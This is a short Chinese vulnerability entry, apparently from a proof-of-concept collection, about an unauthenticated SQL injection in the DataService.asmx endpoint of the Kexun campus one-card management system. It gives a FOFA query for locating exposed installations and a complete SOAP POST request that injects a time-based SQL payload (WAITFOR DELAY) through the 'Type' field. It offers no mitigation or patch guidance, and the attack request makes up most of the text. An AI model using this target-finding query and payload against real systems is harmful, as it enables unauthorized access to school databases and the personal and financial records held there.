# 科讯一卡通管理系统DataService.asmx存在SQL注入漏洞

科讯校园一卡通管理系统DataService.asmx存在SQL注入漏洞，未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息。

## fofa

```yaml
body="http://www.ahkxsoft.com/" && body="一卡通登录"
```

## poc

```yaml
POST /DataService.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/ExeAppCmd"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ExeAppCmd xmlns="http://tempuri.org/">
      <str>{"cmd":"get_sb_guanli","Type":"1');WAITFOR DELAY '0:0:4'--"}</str>
      <files>MTIz</files>
    </ExeAppCmd>
  </soap:Body>
</soap:Envelope>
```

